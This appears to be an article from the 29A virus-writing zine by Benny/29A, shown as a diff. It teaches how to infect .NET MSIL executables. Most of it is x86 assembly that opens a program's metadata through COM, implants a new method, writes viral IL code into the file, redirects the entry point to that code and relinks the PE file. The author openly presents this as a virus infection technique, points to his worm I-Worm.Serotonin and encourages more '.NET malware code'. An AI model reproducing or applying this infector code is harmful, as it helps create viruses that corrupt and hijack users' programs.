@@ -1,0 +1,337 @@
+
+                       . .: .:.. :.. .. .:.::. :. ..:
+                     <<-==млллллм=млллллм=млллллм===<
+                      .:: ллл ллл:ллл ллл.ллл ллл .:.
+                      . .:.мммллп.плллллл.ллллллл:..
+                       ...лллмммм:ммммллл:ллл ллл.::.
+                      >===ллллллл=ллллллп=ллл ллл=->>
+                     .: .:.. ..:. .: ..:.::. ::.. :.:.
+
+
+                     MSIL-PE-EXE infection strategies
+                                   by
+                                Benny/29A
+
+
+
+
+
+In my last article about .NET platform called "Microsoft .NET Common Language
+Runtime Overview" I introduced technologies that .NET Framework Beta2 provides
+us. I also showed infector for .NET applications written in C# (called "Donut"
+by AVerz). Very soon after publishing Microsoft released sharp version of
+Visual Studio .NET. Since that time nothing changed at all, this version does
+not differ from the beta2 much. But I had more time, documentation and
+knowledge to explore this environment.
+
+When I was coding I-Worm.Serotonin I wanted to go more futher rather than with
+Donut. Donut was able to replace CLR header and metadata by some strange way
+with its own and by other non-effective way execute back the host program.
+I was sure there must exist some way how to code REAL file infector for
+.NET programs. Time had passed on, next step was awaited. Not replace, but
+infect metadata by adding new viral data, ansuring their primary activation
+right and calling back the host program. That meant to analyse a structure
+of metadata and find a way how to implant new members to current code without
+any bugs and suspicious actions on user's screen.
+
+While analysing CLR documentation I found out the environment disposes of 
+rich interface for working with it and that this is very transparent - it
+allows to access it from both of inside managed program and outside it (for
+native applications). Tools and helper programs don't need to access metadata
+directly. All they have to do is call proper environment functions. Compilers,
+linkers, debuggers, they don't need to know almost no internal structures,
+everything is managed by system.
+
+Note:	Include file COR.INC that helps to handle CLR and metadata structures
+	is possible to find in this issue (29A#7).
+	You can find detailed Microsoft documentation at
+	MSVS_NET_PATH\FrameworkSDK\Tool Developers guide\docs.
+
+As I said before, CLR environment provides some COM interfaces. Those basic
+ones (discussed here) are these:
+
+
+For metadata opening:		For metadata (and manifest) modification:
+
+IMetaDataDispenser		IMetaDataEmit
+IMetaDataDispenserEx		IMetaDataAssemblyEmit
+
+
+For metadata (and manifest) analysis:
+
+IMetaDataImport
+IMetaDataAssemblyImport
+
+
+I will start with the simplest task - let's open metadata of file stored on
+disk. At first we have to initialize COM and create "Dispenser" object which
+will give us requested interface. Here comes the code:
+
+
+
+	push	0			;reserved, must be 0
+	call	CoInitialize
+
+
+	push	offset ppv		;pointer to returned interface
+	call	@over_iid
+	IID_IMetaDataDispenserEx	;required interface identifier
+@over_iid:
+	push	1			;CLSCTX_INPROC_SERVER
+	push	0			;not part of an agregate
+	call	@over_clsid
+	CLSID_CorMetaDataDispenser	;object identifier
+@over_clsid:
+	call	CoCreateInstance
+
+
+
+Now we have a pointer to requested IMetaDataDispenserEx interface and we can
+call its methods:
+
+DefineScope
+OpenScope
+OpenScopeOnMemory
+
+The most interesting method is OpenScope that allows elegantly access metadata
+from executable file stored on disk. This method returns an interface
+(IMetaDataEmit, IMetaDataImport, IMetaDataAssemblyEmit or IMetaDataAssemblyImport)
+thru which we can access metadata members.
+
+
+
+	push	offset pEmit		;pointer to returned interface
+	call	@over_iid2
+	IID_IMetaDataEmit		;requested interface identifier
+@over_iid2:
+	push	0			;open for read (1 for write)
+	call	@over_wsz		;filename in unicode
+	dw	'c',':','\','p','r','o','g','.','e','x','e',0
+@over_wsz:
+	mov	eax,[ppv]		;EAX = pointer to Dispenser object
+	push	eax			;"this" calling convention
+	mov	eax,[eax]
+	call	[eax.IMetaDataDispenser_OpenScope]
+
+
+
+And now we will try to do something more difficult - declare new global method
+"void METHOD_IMPLANTED()" in metadata:
+
+
+
+	push	offset mdToken		;returned method token
+	push	0			;implementation flags
+	push	0			;RVA of method IL code (can be set l8er by SetRVA method)
+	push	3			;number of bytes in signature
+	call	@over_sig
+	db	IMAGE_CEE_CS_CALLCONV_HASTHIS,0,ELEMENT_TYPE_VOID
+@over_sig:				;method signature (in/out arguments)
+	push	mdPrivate or mdStatic	;method attributes
+	call	@over_wsz2
+	dw	'M','E','T','H','O','D','_','I','M','P','L','A','N','T','E','D',0
+@over_wsz2:				;method name
+	push	0			;0 = global method
+	mov	eax,[pEmit]		;EAX = pointer to Emitter
+	push	eax
+	mov	eax,[eax]
+	call	[eax.IMetaDataEmit_DefineMethod]
+
+
+
+Similarly we can call other Emitter methods. When everything is finished we should
+not forget to release all objects from memory:
+
+
+	mov	eax,[pEmit]
+	push	eax
+	mov	eax,[eax]
+	call	[eax.IUnknown_Release]
+
+	mov	eax,[ppv]
+	push	eax
+	mov	eax,[eax]
+	call	[eax.IUnknown_Release]
+
+
+
+I won't go deeper in details here, all these methods (used by compilers to generate
+metadata) are very well documented. It will be better to look at some other useful
+but not so well documented stuff - interface for linkers. You probably know that
+metadata itself is not enough to execute the program, metadata describes only
+application's object layout. Full-functional program have to be linked as PE EXE
+file where are stored not only metadata but also MSIL code - that can be stored
+in any readable section. So, in a short form, all we have to do is re-compile
+and re-link the file using new metadata.
+
+Only documentation I was able to find is one header file stored like
+MSVS_NET_Path\FrameworkSDK\Include\ICeeFileGen.h. ICeeFileGen class is described
+there and all its public methods. There are described also two APIs, CreateICeeFileGen
+and DestroyICeeFileGen. Source code itself helps to understand that it's a description
+of object (and its interface) used for executable file generation. But where can we
+find the code of that?
+
+Look at folder of .NET Framework core (%windir%\Microsoft.NET\Framework\v1.0.3705\)
+and focus on mscorpe.dll. This is our golden treasure we are looking for. Check which
+APIs it exports and you will find out that it corresponds with ICeeFileGen.h file.
+
+So, here we go:
+
+
+	@pushsz	'mscorpe'		;name of DLL
+	call	LoadLibraryA		;load it
+	xchg	eax,ebx			;address in EBX
+
+	@pushsz	'DestroyICeeFileGen'
+	push	ebx
+	call	GetProcAddress
+	xchg	eax,esi			;address of DestroyICeeFileGen API in ESI
+
+	@pushsz	'CreateICeeFileGen'
+	push	ebx
+	call	GetProcAddress		;address of CreateICeeFileGen API in EAX
+
+	push	offset ICeeFileGen	;pointer to interface variable
+	call	eax			;create object interface
+
+	mov	edi,[ICeeFileGen]	;pointer to interface in EDI
+	mov	edi,[edi]		;interface in EDI
+
+	push	offset file_handle
+	call	[edi.ICeeFileGen_CreateCeeFile]
+					;object initialization
+
+
+
+	call	@over_outwsz
+	dw	'c',':','\','o','u','t','p','u','t','.','e','x','e',0
+@over_outwsz:
+	push	[file_handle]
+	call	[edi.ICeeFileGen_SetOutputFileName]
+					;set output file to "c:\output.exe"
+
+	;we also have to write new IL code to our file. we will reserve a place in PE
+	;file (so called "section") and copy there our data. everything is done in
+	;memory, all datas are flushed on disk at final stage.
+
+	push	[file_handle]
+	call	[edi.ICeeFileGen_LinkCeeFile]
+					;before we will start to work with addresses
+					;we have to re-link program in memory
+
+	push	offset il_section
+	push	[file_handle]
+	call	[edi.ICeeFileGen_GetIlSection]
+					;request section for IL code
+
+	push	offset il_section_rva
+	push	[il_section]
+	call	[edi.ICeeFileGen_GetSectionRVA]
+					;we have to know RVA of section
+
+	push	offset raw_il_section
+	push	1
+	push	4
+	push	[il_section]
+	call	[edi.ICeeFileGen_GetSectionBlock]
+					;allocate 4 bytes. we won't use them, it is
+					;only a trick to get offset in section
+
+	push	offset il_section_offset
+	push	[raw_il_section]
+	push	[il_section]
+	call	[edi.ICeeFileGen_ComputeSectionOffset]
+					;now we know offset in our section
+
+
+	;we will set RVA of our new method
+
+	mov	eax,offset il_section_rva
+	push	eax			;EAX = section address
+	add	[eax],12345678h		;EAX += offset in section
+il_section_offset = dword ptr $-4
+	add	dword ptr [eax],4	;EAX += 4 (we have to skip first allocated bytes)
+	push	dword ptr [eax]
+	push	[mdToken]
+	mov	eax,[pEmit]
+	push	eax
+	mov	eax,[eax]
+	call	[eax.IMetaDataEmit_SetRVA]
+
+
+	;we will reserve next place for our code, immediately following our 4 bytez
+
+	push	offset raw_il_section
+	push	1
+	push	IL_code_size
+	push	[il_section]
+	call	[edi.ICeeFileGen_GetSectionBlock]
+
+	pushad
+	mov	esi,offset IL_code	;address of IL code of our new method
+	mov	edi,12345678h		;target memory address
+raw_il_section = dword ptr $-4
+	mov	ecx,IL_code_size	;size of IL code
+	rep	movsb			;copy IL code to file
+	popad
+
+
+
+	...				;other stuff defining parameters of linking
+
+
+
+	push	[mdToken]
+	push	[file_handle]
+	call	[edi.ICeeFileGen_SetEntryPoint]
+					;set entrypoint to our new method
+
+	push	[pEmit]
+	push	[file_handle]
+	call	[edi.ICeeFileGen_EmitMetaDataEx]
+					;write metadata to file
+
+	push	[file_handle]
+	call	[edi.ICeeFileGen_LinkCeeFile]
+					;re-link PE file in memory
+
+	push	[file_handle]
+	call	[edi.ICeeFileGen_GenerateCeeFile]
+					;write PE file to disk
+
+
+
+	push	offset file_handle
+	call	[edi.ICeeFileGen_DestroyCeeFile]
+					;unitialize object
+	push	offset ICeeFileGen
+	call	esi			;release object from memory
+
+	push	ebx
+	call	FreeLibrary		;release library from memory
+
+
+
+And that's all. As you can see, it is very simple and effective. If you
+want to see real functional code working on this base, look at my
+I-Worm.Serotonin. Everything mentioned here and many many more can be
+found there.
+
+.NET CLR environment is very pleasant to viral infiltrations. It provides
+such abstraction that author does not care of almost no implementation
+stuff. There are much more features in this environment I hadn't described.
+Nothing is impossible. I am VERY sure that it is possible to implement
+most viral techniques and strategies that we know from Win32 world. It
+only depends on our patience and time we want to invest to our .NET malware
+code.
+
+
+
+
+
+						................................
+						.
+						.  Jan 25 2003	Benny/29A
+						.		benny@post.cz
+						.
+						... searching for perfection ...
